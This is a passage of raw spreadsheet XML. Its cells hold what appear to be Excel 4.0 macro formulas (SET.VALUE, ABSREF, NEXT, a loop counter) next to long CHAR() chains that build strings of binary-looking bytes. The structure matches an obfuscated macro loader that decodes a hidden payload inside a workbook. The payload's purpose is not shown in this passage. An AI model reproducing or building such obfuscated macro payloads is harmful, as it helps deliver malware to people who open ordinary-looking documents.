245)&amp;CHAR(56)&amp;CHAR(147)&amp;CHAR(47)&amp;CHAR(130)&amp;CHAR(117)&amp;CHAR(108)&amp;CHAR(160)&amp;CHAR(178)&amp;CHAR(134)&amp;CHAR(180)&amp;CHAR(40)&amp;CHAR(8)&amp;CHAR(31)&amp;CHAR(131)&amp;CHAR(67)&amp;CHAR(221)&amp;CHAR(94)&amp;CHAR(36)&amp;CHAR(227)&amp;CHAR(80)&amp;CHAR(91)&amp;CHAR(10)&amp;CHAR(86)&amp;CHAR(18)&amp;CHAR(120)&amp;CHAR(191)&amp;CHAR(162)&amp;CHAR(9)&amp;CHAR(200)&amp;CHAR(105)&amp;CHAR(169)&amp;CHAR(53)&amp;CHAR(3)&amp;CHAR(113)&amp;CHAR(170)&amp;CHAR(238)&amp;CHAR(141)&amp;CHAR(14)&amp;CHAR(196)&amp;CHAR(79)&amp;CHAR(95)&amp;CHAR(61)&amp;CHAR(78)&amp;CHAR(169)&amp;CHAR(17)&amp;CHAR(243)&amp;CHAR(47)&amp;CHAR(242)&amp;CHAR(74)&amp;CHAR(16)&amp;CHAR(218)&amp;CHAR(229)&amp;CHAR(242)&amp;CHAR(54)&amp;CHAR(109)&amp;CHAR(242)&amp;CHAR(237)&amp;CHAR(186)&amp;CHAR(71)&amp;CHAR(115)&amp;CHAR(234)&amp;CHAR(220)&amp;CHAR(3)&amp;CHAR(223)&amp;CHAR(182)&amp;CHAR(71)&amp;CHAR(196)&amp;CHAR(194)&amp;CHAR(250)&amp;CHAR(252)&amp;CHAR(21)&amp;CHAR(2)&amp;CHAR(128)&amp;CHAR(101)&amp;CHAR(186)&amp;CHAR(41)&amp;CHAR(59)&amp;CHAR(206)&amp;CHAR(184)&amp;CHAR(99)&amp;CHAR(197)&amp;CHAR(48)&amp;CHAR(104)&amp;CHAR(53)&amp;CHAR(83)&amp;CHAR(57)&amp;CHAR(189)&amp;CHAR(132)&amp;CHAR(36)&amp;CHAR(221)&amp;CHAR(93)&amp;CHAR(234)&amp;CHAR(37)&amp;CHAR(18)&amp;CHAR(53)&amp;CHAR(47)&amp;CHAR(48)&amp;CHAR(88)&amp;CHAR(128)&amp;CHAR(188)&amp;CHAR(172)&amp;CHAR(163)&amp;CHAR(147)&amp;CHAR(16)&amp;CHAR(81)&amp;CHAR(29)&amp;CHAR(205)&amp;CHAR(227)&amp;CHAR(215)&amp;CHAR(159)&amp;CHAR(125)&amp;CHAR(42)&amp;CHAR(239)&amp;CHAR(255)&amp;CHAR(151)&amp;CHAR(148)&amp;CHAR(208)&amp;CHAR(164)&amp;CHAR(95)&amp;CHAR(1)&amp;CHAR(236)&amp;CHAR(93)&amp;CHAR(47)&amp;CHAR(62)&amp;CHAR(242)&amp;CHAR(214)&amp;CHAR(8)&amp;CHAR(250)&amp;CHAR(61)&amp;CHAR(115)&amp;CHAR(108)&amp;CHAR(163)&amp;CHAR(255)&amp;CHAR(34)&amp;CHAR(229)&amp;CHAR(216)&amp;CHAR(43)&amp;CHAR(43)&amp;CHAR(45)&amp;CHAR(247)&amp;CHAR(220)&amp;CHAR(233)&amp;CHAR(105)&amp;CHAR(191)&amp;CHAR(89)&amp;CHAR(151)&amp;CHAR(24)&amp;CHAR(95)&amp;CHAR(26)&amp;CHAR(112)&amp;CHAR(1)&amp;CHAR(225)&amp;CHAR(246)&amp;CHAR(46)&amp;CHAR(91)&amp;CHAR(3)&amp;CHAR(199)&amp;CHAR(191)&amp;CHAR(22)&amp;CHAR(28)&amp;CHAR(118)&amp;CHAR(108)&amp;CHAR(149)&amp;CHAR(187)&amp;CHAR(91)&amp;CHAR(225)&amp;CHAR(128)&amp;CHAR(108)&amp;CHAR(15)&amp;CHAR(176)&amp;CHAR(52)&amp;CHAR(205)&amp;CHAR(204)&amp;CHAR(209)&amp;CHAR(191)&amp;CHAR(141)&amp;CHAR(2)&amp;CHAR(65)&amp;CHAR(16)&amp;CHAR(127)&amp;CHAR(43)&amp;CHAR(82)&amp;CHAR(58)&amp;CHAR(120)&amp;CHAR(165)&amp;CHAR(194)&amp;CHAR(97)&amp;CHAR(187)&amp;CHAR(95)&amp;CHAR(129)&amp;CHAR(8)&amp;CHAR(120)&amp;CHAR(65)&amp;CHAR(17)&amp;CHAR(231)&amp;CHAR(237)&amp;CHAR(177)&amp;CHAR(106)&amp;CHAR(18)&amp;CHAR(32)&amp;CHAR(119)&amp;CHAR(64)&amp;CHAR(86)&amp;CHAR(33)&amp;CHAR(143)&amp;CHAR(245)&amp;CHAR(123)&amp;CHAR(96)&amp;CHAR(80)&amp;CHAR(174)&amp;CHAR(113)&amp;CHAR(252)</f>
        <v>¬Ösj8ý]•~—³k£ø_x001A_õj‡YJ	òù_x0015_Fi¨ê‹]E‚¹N_x0019_;éÁ¥gäõ8“/‚ul ²†´(_x0008__x001F_ƒCÝ^$ãP[
V_x0012_x¿¢	Èi©5_x0003_qªî_x000E_ÄO_=N©_x0011_ó/òJ_x0010_Úåò6mòíºGsêÜ_x0003_ß¶GÄÂúü_x0015__x0002_€eº);Î¸cÅ0h5S9½„$Ý]ê%_x0012_5/0X€¼¬£“_x0010_Q_x001D_Íã×Ÿ}*ïÿ—”Ð¤__x0001_ì]/&gt;òÖ_x0008_ú=sl£ÿ"åØ++-÷Üéi¿Y—_x0018___x001A_p_x0001_áö.[_x0003_Ç¿_x0016__x001C_vl•»[á€l_x000F_°4ÍÌÑ¿_x0002_A_x0010_+R:x¥Âa»__x0008_xA_x0011_çí±j_x0012_ w@V!õ{`P®qü</v>
      </c>
      <c r="C34" t="str">
        <f>CHAR(46)&amp;CHAR(203)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(158)&amp;CHAR(135)&amp;CHAR(181)&amp;CHAR(133)&amp;CHAR(243)&amp;CHAR(224)</f>
        <v>.Ë!¥ž‡µ…óà</v>
      </c>
    </row>
    <row r="35" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A35" t="b">
        <f>SET.VALUE(D1,D1+1)</f>
        <v>0</v>
      </c>
      <c r="B35" t="str">
        <f>CHAR(168)&amp;CHAR(204)&amp;CHAR(235)&amp;CHAR(116)&amp;CHAR(73)&amp;CHAR(209)&amp;CHAR(77)&amp;CHAR(67)&amp;CHAR(233)&amp;CHAR(81)&amp;CHAR(152)&amp;CHAR(219)&amp;CHAR(45)&amp;CHAR(73)&amp;CHAR(248)&amp;CHAR(127)&amp;CHAR(119)&amp;CHAR(9)&amp;CHAR(184)&amp;CHAR(249)&amp;CHAR(185)&amp;CHAR(161)&amp;CHAR(34)&amp;CHAR(146)&amp;CHAR(61)&amp;CHAR(74)&amp;CHAR(216)&amp;CHAR(63)&amp;CHAR(163)&amp;CHAR(231)&amp;CHAR(159)&amp;CHAR(247)&amp;CHAR(248)&amp;CHAR(139)&amp;CHAR(74)&amp;CHAR(24)&amp;CHAR(140)&amp;CHAR(179)&amp;CHAR(49)&amp;CHAR(61)&amp;CHAR(251)&amp;CHAR(73)&amp;CHAR(181)&amp;CHAR(175)&amp;CHAR(98)&amp;CHAR(240)&amp;CHAR(24)&amp;CHAR(96)&amp;CHAR(107)&amp;CHAR(247)&amp;CHAR(78)&amp;CHAR(226)&amp;CHAR(129)&amp;CHAR(172)&amp;CHAR(31)&amp;CHAR(166)&amp;CHAR(123)&amp;CHAR(154)&amp;CHAR(94)&amp;CHAR(112)&amp;CHAR(79)&amp;CHAR(15)&amp;CHAR(26)&amp;CHAR(188)&amp;CHAR(3)&amp;CHAR(210)&amp;CHAR(172)&amp;CHAR(200)&amp;CHAR(226)&amp;CHAR(90)&amp;CHAR(90)&amp;CHAR(166)&amp;CHAR(246)&amp;CHAR(217)&amp;CHAR(161)&amp;CHAR(65)&amp;CHAR(122)&amp;CHAR(144)&amp;CHAR(207)&amp;CHAR(132)&amp;CHAR(43)&amp;CHAR(7)&amp;CHAR(16)&amp;CHAR(240)&amp;CHAR(57)&amp;CHAR(86)&amp;CHAR(246)&amp;CHAR(249)&amp;CHAR(54)&amp;CHAR(182)&amp;CHAR(176)&amp;CHAR(59)&amp;CHAR(205)&amp;CHAR(215)&amp;CHAR(212)&amp;CHAR(69)&amp;CHAR(147)&amp;CHAR(178)&amp;CHAR(8)&amp;CHAR(248)&amp;CHAR(20)&amp;CHAR(135)&amp;CHAR(242)&amp;CHAR(60)&amp;CHAR(180)&amp;CHAR(160)&amp;CHAR(70)&amp;CHAR(218)&amp;CHAR(222)&amp;CHAR(57)&amp;CHAR(99)&amp;CHAR(132)&amp;CHAR(182)&amp;CHAR(83)&amp;CHAR(247)&amp;CHAR(143)&amp;CHAR(217)&amp;CHAR(4)&amp;CHAR(4)&amp;CHAR(181)&amp;CHAR(229)&amp;CHAR(20)&amp;CHAR(183)&amp;CHAR(209)&amp;CHAR(25)&amp;CHAR(130)&amp;CHAR(29)&amp;CHAR(77)&amp;CHAR(72)&amp;CHAR(5)&amp;CHAR(129)&amp;CHAR(200)&amp;CHAR(70)&amp;CHAR(231)&amp;CHAR(251)&amp;CHAR(102)&amp;CHAR(28)&amp;CHAR(103)&amp;CHAR(123)&amp;CHAR(29)&amp;CHAR(74)&amp;CHAR(236)&amp;CHAR(93)&amp;CHAR(221)&amp;CHAR(8)&amp;CHAR(24)&amp;CHAR(195)&amp;CHAR(127)&amp;CHAR(220)&amp;CHAR(128)&amp;CHAR(250)&amp;CHAR(119)&amp;CHAR(196)&amp;CHAR(192)&amp;CHAR(154)&amp;CHAR(65)&amp;CHAR(39)&amp;CHAR(192)&amp;CHAR(162)&amp;CHAR(50)&amp;CHAR(172)&amp;CHAR(138)&amp;CHAR(105)&amp;CHAR(186)&amp;CHAR(2)&amp;CHAR(168)&amp;CHAR(124)&amp;CHAR(217)&amp;CHAR(193)&amp;CHAR(79)&amp;CHAR(120)&amp;CHAR(159)&amp;CHAR(99)&amp;CHAR(17)&amp;CHAR(176)&amp;CHAR(101)&amp;CHAR(42)&amp;CHAR(221)&amp;CHAR(120)&amp;CHAR(150)&amp;CHAR(66)&amp;CHAR(158)&amp;CHAR(185)&amp;CHAR(58)&amp;CHAR(169)&amp;CHAR(239)&amp;CHAR(43)&amp;CHAR(184)&amp;CHAR(222)&amp;CHAR(68)&amp;CHAR(59)&amp;CHAR(251)&amp;CHAR(46)&amp;CHAR(154)&amp;CHAR(52)&amp;CHAR(29)&amp;CHAR(57)&amp;CHAR(2)&amp;CHAR(128)&amp;CHAR(221)&amp;CHAR(196)&amp;CHAR(38)&amp;CHAR(79)&amp;CHAR(193)&amp;CHAR(99)&amp;CHAR(96)&amp;CHAR(164)&amp;CHAR(255)&amp;CHAR(123)&amp;CHAR(39)&amp;CHAR(95)&amp;CHAR(157)&amp;CHAR(164)&amp;CHAR(86)&amp;CHAR(97)&amp;CHAR(195)&amp;CHAR(127)&amp;CHAR(176)&amp;CHAR(92)&amp;CHAR(210)&amp;CHAR(32)&amp;CHAR(32)&amp;CHAR(168)&amp;CHAR(149)&amp;CHAR(250)&amp;CHAR(81)&amp;CHAR(159)&amp;CHAR(205)&amp;CHAR(244)&amp;CHAR(160)&amp;CHAR(169)&amp;CHAR(23)&amp;CHAR(28)&amp;CHAR(229)&amp;CHAR(167)&amp;CHAR(49)&amp;CHAR(65)&amp;CHAR(216)&amp;CHAR(76)&amp;CHAR(153)&amp;CHAR(6)&amp;CHAR(186)&amp;CHAR(189)&amp;CHAR(184)&amp;CHAR(80)&amp;CHAR(124)&amp;CHAR(144)&amp;CHAR(141)&amp;CHAR(30)&amp;CHAR(2)&amp;CHAR(66)&amp;CHAR(135)&amp;CHAR(241)&amp;CHAR(86)&amp;CHAR(202)</f>
        <v>¨ÌëtIÑMCéQ˜Û-Iøw	¸ù¹¡"’=JØ?£çŸ÷ø‹J_x0018_Œ³1=ûIµ¯bð_x0018_`k÷Nâ¬_x001F_¦{š^pO_x000F__x001A_¼_x0003_Ò¬ÈâZZ¦öÙ¡AzÏ„+_x0007__x0010_ð9Vöù6¶°;Í×ÔE“²_x0008_ø_x0014_‡ò&lt;´ FÚÞ9c„¶S÷Ù_x0004__x0004_µå_x0014_·Ñ_x0019_‚_x001D_MH_x0005_ÈFçûf_x001C_g{_x001D_Jì]Ý_x0008__x0018_ÃÜ€úwÄÀšA'À¢2¬Šiº_x0002_¨|ÙÁOxŸc_x0011_°e*Ýx–Bž¹:©ï+¸ÞD;û.š4_x001D_9_x0002_€ÝÄ&amp;OÁc`¤ÿ{'_¤VaÃ°\Ò  ¨•úQŸÍô ©_x0017__x001C_å§1AØL™_x0006_º½¸P|_x001E__x0002_B‡ñVÊ</v>
      </c>
      <c r="C35" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(135)&amp;CHAR(189)&amp;CHAR(119)&amp;CHAR(150)&amp;CHAR(129)&amp;CHAR(168)&amp;CHAR(85)</f>
        <v>!¥û‡½w–¨U</v>
      </c>
    </row>
    <row r="36" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A36" t="b">
        <f bx="1">main=ABSREF("R[1]C",main)</f>
        <v>0</v>
      </c>
      <c r="B36" t="str">
        <f>CHAR(239)&amp;CHAR(194)&amp;CHAR(238)&amp;CHAR(33)&amp;CHAR(204)&amp;CHAR(18)&amp;CHAR(242)&amp;CHAR(80)&amp;CHAR(225)&amp;CHAR(52)&amp;CHAR(97)&amp;CHAR(133)&amp;CHAR(250)&amp;CHAR(84)&amp;CHAR(28)&amp;CHAR(111)&amp;CHAR(187)&amp;CHAR(39)&amp;CHAR(76)&amp;CHAR(147)&amp;CHAR(81)&amp;CHAR(58)&amp;CHAR(168)&amp;CHAR(148)&amp;CHAR(235)&amp;CHAR(61)&amp;CHAR(54)&amp;CHAR(163)&amp;CHAR(115)&amp;CHAR(171)&amp;CHAR(49)&amp;CHAR(55)&amp;CHAR(35)&amp;CHAR(46)&amp;CHAR(185)&amp;CHAR(103)&amp;CHAR(31)&amp;CHAR(42)&amp;CHAR(222)&amp;CHAR(15)&amp;CHAR(17)&amp;CHAR(59)&amp;CHAR(222)&amp;CHAR(36)&amp;CHAR(134)&amp;CHAR(66)&amp;CHAR(35)&amp;CHAR(77)&amp;CHAR(21)&amp;CHAR(187)&amp;CHAR(184)&amp;CHAR(158)&amp;CHAR(61)&amp;CHAR(173)&amp;CHAR(209)&amp;CHAR(39)&amp;CHAR(139)&amp;CHAR(13)&amp;CHAR(22)&amp;CHAR(93)&amp;CHAR(188)&amp;CHAR(193)&amp;CHAR(57)&amp;CHAR(195)&amp;CHAR(82)&amp;CHAR(2)&amp;CHAR(37)&amp;CHAR(180)&amp;CHAR(88)&amp;CHAR(40)&amp;CHAR(157)&amp;CHAR(72)&amp;CHAR(197)&amp;CHAR(91)&amp;CHAR(148)&amp;CHAR(128)&amp;CHAR(180)&amp;CHAR(67)&amp;CHAR(167)&amp;CHAR(15)&amp;CHAR(73)&amp;CHAR(41)&amp;CHAR(251)&amp;CHAR(224)&amp;CHAR(174)&amp;CHAR(220)&amp;CHAR(143)&amp;CHAR(103)&amp;CHAR(24)&amp;CHAR(77)&amp;CHAR(108)&amp;CHAR(131)&amp;CHAR(150)&amp;CHAR(240)&amp;CHAR(83)&amp;CHAR(174)&amp;CHAR(190)&amp;CHAR(9)&amp;CHAR(230)&amp;CHAR(186)&amp;CHAR(162)&amp;CHAR(206)&amp;CHAR(107)&amp;CHAR(9)&amp;CHAR(145)&amp;CHAR(178)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(110)&amp;CHAR(51)&amp;CHAR(163)&amp;CHAR(141)&amp;CHAR(35)&amp;CHAR(105)&amp;CHAR(63)&amp;CHAR(217)&amp;CHAR(63)&amp;CHAR(142)&amp;CHAR(237)&amp;CHAR(4)&amp;CHAR(95)&amp;CHAR(75)&amp;CHAR(35)&amp;CHAR(16)&amp;CHAR(50)&amp;CHAR(232)&amp;CHAR(18)&amp;CHAR(184)&amp;CHAR(50)&amp;CHAR(42)&amp;CHAR(24)&amp;CHAR(40)&amp;CHAR(13)&amp;CHAR(155)&amp;CHAR(231)&amp;CHAR(194)&amp;CHAR(74)&amp;CHAR(122)&amp;CHAR(191)&amp;CHAR(169)&amp;CHAR(51)&amp;CHAR(136)&amp;CHAR(215)&amp;CHAR(217)&amp;CHAR(74)&amp;CHAR(214)&amp;CHAR(71)&amp;CHAR(13)&amp;CHAR(43)&amp;CHAR(83)&amp;CHAR(169)&amp;CHAR(118)&amp;CHAR(221)&amp;CHAR(138)&amp;CHAR(191)&amp;CHAR(177)&amp;CHAR(207)&amp;CHAR(75)&amp;CHAR(43)&amp;CHAR(98)&amp;CHAR(122)&amp;CHAR(159)&amp;CHAR(118)&amp;CHAR(101)&amp;CHAR(46)&amp;CHAR(245)&amp;CHAR(254)&amp;CHAR(251)&amp;CHAR(57)&amp;CHAR(174)&amp;CHAR(199)&amp;CHAR(245)&amp;CHAR(239)&amp;CHAR(121)&amp;CHAR(205)&amp;CHAR(211)&amp;CHAR(211)&amp;CHAR(99)&amp;CHAR(188)&amp;CHAR(91)&amp;CHAR(98)&amp;CHAR(1)&amp;CHAR(177)&amp;CHAR(113)&amp;CHAR(146)&amp;CHAR(38)&amp;CHAR(52)&amp;CHAR(182)&amp;CHAR(98)&amp;CHAR(42)&amp;CHAR(130)&amp;CHAR(11)&amp;CHAR(25)&amp;CHAR(215)&amp;CHAR(43)&amp;CHAR(112)&amp;CHAR(114)&amp;CHAR(172)&amp;CHAR(123)&amp;CHAR(41)&amp;CHAR(48)&amp;CHAR(197)&amp;CHAR(114)&amp;CHAR(223)&amp;CHAR(130)&amp;CHAR(97)&amp;CHAR(32)&amp;CHAR(30)&amp;CHAR(51)&amp;CHAR(174)&amp;CHAR(70)&amp;CHAR(31)&amp;CHAR(95)&amp;CHAR(186)&amp;CHAR(157)&amp;CHAR(163)&amp;CHAR(247)&amp;CHAR(80)&amp;CHAR(89)&amp;CHAR(111)&amp;CHAR(121)&amp;CHAR(138)&amp;CHAR(36)&amp;CHAR(200)&amp;CHAR(255)&amp;CHAR(215)&amp;CHAR(92)&amp;CHAR(103)&amp;CHAR(183)&amp;CHAR(36)&amp;CHAR(59)&amp;CHAR(82)&amp;CHAR(233)&amp;CHAR(241)&amp;CHAR(144)&amp;CHAR(11)&amp;CHAR(137)&amp;CHAR(249)&amp;CHAR(170)&amp;CHAR(96)&amp;CHAR(72)&amp;CHAR(11)&amp;CHAR(182)&amp;CHAR(75)&amp;CHAR(138)&amp;CHAR(33)&amp;CHAR(198)&amp;CHAR(80)&amp;CHAR(254)&amp;CHAR(159)&amp;CHAR(155)&amp;CHAR(42)&amp;CHAR(189)&amp;CHAR(40)&amp;CHAR(48)</f>
        <v>ïÂî!Ì_x0012_òPá4a…úT_x001C_o»'L“Q:¨”ë=6£s«17#.¹g_x001F_*Þ_x000F__x0011_;Þ$†B#M_x0015_»¸ž=­Ñ'‹_x000D__x0016_]¼Á9ÃR_x0002_%´X(HÅ[”€´C§_x000F_I)ûà®Üg_x0018_Mlƒ–ðS®¾	æº¢Îk	‘²_x000D__x0002_n3£#i?Ù?Ží_x0004__K#_x0010_2è_x0012_¸2*_x0018_(_x000D_›çÂJz¿©3ˆ×ÙJÖG_x000D_+S©vÝŠ¿±ÏK+bzŸve.õþû9®ÇõïyÍÓÓc¼[b_x0001_±q’&amp;4¶b*‚_x000B__x0019_×+pr¬{)0Årß‚a _x001E_3®F_x001F__º£÷PYoyŠ$Èÿ×\g·$;Réñ_x000B_‰ùª`H_x000B_¶KŠ!ÆPþŸ›*½(0</v>
      </c>
      <c r="C36" t="str">
        <f>CHAR(179)&amp;CHAR(66)&amp;CHAR(43)&amp;CHAR(215)&amp;CHAR(208)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(237)&amp;CHAR(118)&amp;CHAR(194)</f>
        <v>³B+×ÐÈ!ívÂ</v>
      </c>
    </row>
    <row r="37" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A37" t="b">
        <f>NEXT()</f>
        <v>0</v>
      </c>
      <c r="B37" t="str">
        <f>CHAR(203)&amp;CHAR(128)&amp;CHAR(211)&amp;CHAR(40)&amp;CHAR(203)&amp;CHAR(210)&amp;CHAR(31)&amp;CHAR(202)&amp;CHAR(174)&amp;CHAR(81)&amp;CHAR(123)&amp;CHAR(104)&amp;CHAR(161)&amp;CHAR(93)&amp;CHAR(142)&amp;CHAR(226)&amp;CHAR(80)&amp;CHAR(55)&amp;CHAR(53)&amp;CHAR(81)&amp;CHAR(153)&amp;CHAR(41)&amp;CHAR(183)&amp;CHAR(47)&amp;CHAR(161)&amp;CHAR(194)&amp;CHAR(115)&amp;CHAR(32)&amp;CHAR(106)&amp;CHAR(63)&amp;CHAR(116)&amp;CHAR(41)&amp;CHAR(54)&amp;CHAR(12)&amp;CHAR(166)&amp;CHAR(19)&amp;CHAR(49)&amp;CHAR(205)&amp;CHAR(221)&amp;CHAR(102)&amp;CHAR(77)&amp;CHAR(232)&amp;CHAR(42)&amp;CHAR(79)&amp;CHAR(22)&amp;CHAR(63)&amp;CHAR(211)&amp;CHAR(48)&amp;CHAR(218)&amp;CHAR(200)&amp;CHAR(193)&amp;CHAR(147)&amp;CHAR(32)&amp;CHAR(29)&amp;CHAR(157)&amp;CHAR(72)&amp;CHAR(122)&amp;CHAR(234)&amp;CHAR(184)&amp;CHAR(143)&amp;CHAR(159)&amp;CHAR(4)&amp;CHAR(236)&amp;CHAR(199)&amp;CHAR(149)&amp;CHAR(243)&amp;CHAR(97)&amp;CHAR(14)&amp;CHAR(48)&amp;CHAR(127)&amp;CHAR(171)&amp;CHAR(39)&amp;CHAR(133)&amp;CHAR(234)&amp;CHAR(106)&amp;CHAR(104)&amp;CHAR(224)&amp;CHAR(133)&amp;CHAR(31)&amp;CHAR(51)&amp;CHAR(205)&amp;CHAR(133)&amp;CHAR(236)&amp;CHAR(9)&amp;CHAR(33)&amp;CHAR(42)&amp;CHAR(142)&amp;CHAR(93)&amp;CHAR(221)&amp;CHAR(60)&amp;CHAR(187)&amp;CHAR(117)&amp;CHAR(54)&amp;CHAR(129)&amp;CHAR(252)&amp;CHAR(21)&amp;CHAR(29)&amp;CHAR(63)&amp;CHAR(207)&amp;CHAR(177)&amp;CHAR(185)&amp;CHAR(230)&amp;CHAR(51)&amp;CHAR(119)&amp;CHAR(70)&amp;CHAR(129)&amp;CHAR(144)&amp;CHAR(189)&amp;CHAR(200)&amp;CHAR(27)&amp;CHAR(37)&amp;CHAR(115)&amp;CHAR(140)&amp;CHAR(190)&amp;CHAR(168)&amp;CHAR(36)&amp;CHAR(39)&amp;CHAR(30)&amp;CHAR(251)&amp;CHAR(75)&amp;CHAR(170)&amp;CHAR(217)&amp;CHAR(97)&amp;CHAR(240)&amp;CHAR(123)&amp;CHAR(134)&amp;CHAR(196)&amp;CHAR(83)&amp;CHAR(191)&amp;CHAR(120)&amp;CHAR(171)&amp;CHAR(43)&amp;CHAR(48)&amp;CHAR(134)&amp;CHAR(161)&amp;CHAR(207)&amp;CHAR(83)&amp;CHAR(92)&amp;CHAR(131)&amp;CHAR(24)&amp;CHAR(236)&amp;CHAR(180)&amp;CHAR(214)&amp;CHAR(22)&amp;CHAR(215)&amp;CHAR(61)&amp;CHAR(72)&amp;CHAR(4)&amp;CHAR(166)&amp;CHAR(57)&amp;CHAR(133)&amp;CHAR(202)&amp;CHAR(194)&amp;CHAR(253)&amp;CHAR(15)&amp;CHAR(50)&amp;CHAR(78)&amp;CHAR(143)&amp;CHAR(203)&amp;CHAR(5)&amp;CHAR(67)&amp;CHAR(120)&amp;CHAR(171)&amp;CHAR(84)&amp;CHAR(181)&amp;CHAR(122)&amp;CHAR(152)&amp;CHAR(191)&amp;CHAR(132)&amp;CHAR(219)&amp;CHAR(5)&amp;CHAR(144)&amp;CHAR(105)&amp;CHAR(163)&amp;CHAR(135)&amp;CHAR(245)&amp;CHAR(215)&amp;CHAR(22)&amp;CHAR(13)&amp;CHAR(201)&amp;CHAR(203)&amp;CHAR(159)&amp;CHAR(189)&amp;CHAR(167)&amp;CHAR(168)&amp;CHAR(64)&amp;CHAR(104)&amp;CHAR(119)&amp;CHAR(136)&amp;CHAR(121)&amp;CHAR(41)&amp;CHAR(103)&amp;CHAR(197)&amp;CHAR(110)&amp;CHAR(232)&amp;CHAR(58)&amp;CHAR(102)&amp;CHAR(58)&amp;CHAR(203)&amp;CHAR(65)&amp;CHAR(43)&amp;CHAR(246)&amp;CHAR(43)&amp;CHAR(241)&amp;CHAR(129)&amp;CHAR(157)&amp;CHAR(151)&amp;CHAR(81)&amp;CHAR(183)&amp;CHAR(72)&amp;CHAR(245)&amp;CHAR(223)&amp;CHAR(56)&amp;CHAR(210)&amp;CHAR(97)&amp;CHAR(72)&amp;CHAR(56)&amp;CHAR(248)&amp;CHAR(173)&amp;CHAR(169)&amp;CHAR(133)&amp;CHAR(11)&amp;CHAR(173)&amp;CHAR(40)&amp;CHAR(137)&amp;CHAR(219)&amp;CHAR(126)&amp;CHAR(11)&amp;CHAR(167)&amp;CHAR(51)&amp;CHAR(158)&amp;CHAR(25)&amp;CHAR(3)&amp;CHAR(181)&amp;CHAR(166)&amp;CHAR(80)&amp;CHAR(38)&amp;CHAR(185)&amp;CHAR(10)&amp;CHAR(251)&amp;CHAR(187)&amp;CHAR(153)&amp;CHAR(255)&amp;CHAR(177)&amp;CHAR(82)&amp;CHAR(239)&amp;CHAR(215)&amp;CHAR(237)&amp;CHAR(175)&amp;CHAR(77)&amp;CHAR(128)&amp;CHAR(10)&amp;CHAR(60)&amp;CHAR(210)&amp;CHAR(255)</f>
        <v>Ë€Ó(ËÒ_x001F_Ê®Q{h¡]ŽâP75Q™)·/¡Âs j?t)6_x000C_¦_x0013_1ÍÝfMè*O_x0016_?Ó0ÚÈÁ“ _x001D_Hzê¸Ÿ_x0004_ìÇ•óa_x000E_0«'…êjhà…_x001F_3Í…ì	!*Ž]Ý&lt;»u6ü_x0015__x001D_?Ï±¹æ3wF½È_x001B_%sŒ¾¨$'_x001E_ûKªÙað{†ÄS¿x«+0†¡ÏS\ƒ_x0018_ì´Ö_x0016_×=H_x0004_¦9…ÊÂý_x000F_2NË_x0005_Cx«Tµz˜¿„Û_x0005_i£‡õ×_x0016__x000D_ÉËŸ½§¨@hwˆy)gÅnè:f:ËA+ö+ñ—Q·Hõß8ÒaH8ø­©…_x000B_­(‰Û~_x000B_§3ž_x0019__x0003_µ¦P&amp;¹
û»™ÿ±Rï×í¯M€
&lt;Òÿ</v>
      </c>
      <c r="C37" t="str">
        <f>CHAR(38)&amp;CHAR(183)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(201)&amp;CHAR(112)&amp;CHAR(248)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(212)</f>
        <v>&amp;·ÖÈÉpøÏ&gt;Ô</v>
      </c>
    </row>
    <row r="38" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A38" t="e">
        <f>Queue(A22,-2,0)</f>
        <v>#NAME?</v>
      </c>
      <c r="B38" t="str">
        <f>CHAR(41)&amp;CHAR(210)&amp;CHAR(233)&amp;CHAR(77)&amp;CHAR(19)&amp;CHAR(183)&amp;CHAR(215)&amp;CHAR(70)&amp;CHAR(223)&amp;CHAR(190)&amp;CHAR(156)&amp;CHAR(42)&amp;CHAR(94)&amp;CHAR(251)&amp;CHAR(7)&amp;CHAR(37)&amp;CHAR(2)&amp;CHAR(114)&amp;CHAR(62)&amp;CHAR(5)&amp;CHAR(209)&amp;CHAR(87)&amp;CHAR(163)&amp;CHAR(36)&amp;CHAR(81)&amp;CHAR(181)&amp;CHAR(101)&amp;CHAR(147)&amp;CHAR(71)&amp;CHAR(239)&amp;CHAR(237)&amp;CHAR(190)&amp;CHAR(34)&amp;CHAR(165)&amp;CHAR(2)&amp;CHAR(44)&amp;CHAR(10)&amp;CHAR(245)&amp;CHAR(172)&amp;CHAR(117)&amp;CHAR(214)&amp;CHAR(178)&amp;CHAR(76)&amp;CHAR(63)&amp;CHAR(12)&amp;CHAR(226)&amp;CHAR(240)&amp;CHAR(253)&amp;CHAR(134)&amp;CHAR(189)&amp;CHAR(6)&amp;CHAR(128)&amp;CHAR(171)&amp;CHAR(142)&amp;CHAR(215)&amp;CHAR(154)&amp;CHAR(42)&amp;CHAR(140)&amp;CHAR(184)&amp;CHAR(140)&amp;CHAR(37)&amp;CHAR(169)&amp;CHAR(15)&amp;CHAR(223)&amp;CHAR(135)&amp;CHAR(139)&amp;CHAR(89)&amp;CHAR(25)&amp;CHAR(186)&amp;CHAR(159)&amp;CHAR(189)&amp;CHAR(210)&amp;CHAR(51)&amp;CHAR(48)&amp;CHAR(43)&amp;CHAR(185)&amp;CHAR(179)&amp;CHAR(178)&amp;CHAR(53)&amp;CHAR(241)&amp;CHAR(222)&amp;CHAR(36)&amp;CHAR(151)&amp;CHAR(247)&amp;CHAR(52)&amp;CHAR(165)&amp;CHAR(8)&amp;CHAR(112)&amp;CHAR(208)&amp;CHAR(132)&amp;CHAR(176)&amp;CHAR(244)&amp;CHAR(231)&amp;CHAR(149)&amp;CHAR(83)&amp;CHAR(45)&amp;CHAR(120)&amp;CHAR(70)&amp;CHAR(9)&amp;CHAR(175)&amp;CHAR(14)&amp;CHAR(248)&amp;CHAR(133)&amp;CHAR(129)&amp;CHAR(137)&amp;CHAR(190)&amp;CHAR(71)&amp;CHAR(217)&amp;CHAR(63)&amp;CHAR(7)&amp;CHAR(146)&amp;CHAR(10)&amp;CHAR(134)&amp;CHAR(21)&amp;CHAR(218)&amp;CHAR(247)&amp;CHAR(47)&amp;CHAR(192)&amp;CHAR(81)&amp;CHAR(183)&amp;CHAR(53)&amp;CHAR(255)&amp;CHAR(79)&amp;CHAR(186)&amp;CHAR(1